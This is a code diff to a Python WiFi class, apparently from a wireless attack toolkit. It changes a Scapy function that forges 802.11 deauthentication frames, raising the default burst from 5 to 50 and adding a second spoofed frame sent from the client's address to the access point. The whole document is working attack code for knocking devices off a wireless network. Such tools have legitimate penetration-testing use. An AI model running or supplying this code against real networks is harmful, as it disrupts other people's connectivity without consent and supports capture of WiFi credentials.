@@ -598,20 +598,24 @@ class WiFi:
     def send_deauth(self,
                      bssid: str = '01:23:45:67:89:0a',
                      client: str = '01:23:45:67:89:0b',
-                     number_of_deauth_packets: int = 5) -> None:
+                     number_of_deauth_packets: int = 50) -> None:
         """
         Sending 802.11 deauth packets
         :param bssid: BSSID (example: '01:23:45:67:89:0a')
         :param client: A client MAC address for deauth (example: '01:23:45:67:89:0b')
-        :param number_of_deauth_packets: The number of deauth packets for one iteration (default: 5)
+        :param number_of_deauth_packets: The number of deauth packets for one iteration (default: 50)
         :return: None
         """
-        deauth_packet: bytes = RadioTap() / \
-                               Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
-                               Dot11Deauth(reason=7)
+        client_deauth_packet: bytes = RadioTap() / \
+                                      Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
+                                      Dot11Deauth(reason=7)
+        ap_deauth_packet: bytes = RadioTap() / \
+                                  Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid) / \
+                                  Dot11Deauth(reason=7)
 
-        for _ in range(number_of_deauth_packets):
-            sendp(deauth_packet, iface=self._interface, monitor=True, verbose=False)
+        for _ in range(int(number_of_deauth_packets / 2)):
+            sendp(client_deauth_packet, iface=self._interface, monitor=True, verbose=False)
+            sendp(ap_deauth_packet, iface=self._interface, monitor=True, verbose=False)
 
         self.deauth_packets.append({'packets': number_of_deauth_packets,
                                     'bssid': bssid, 'client': client})
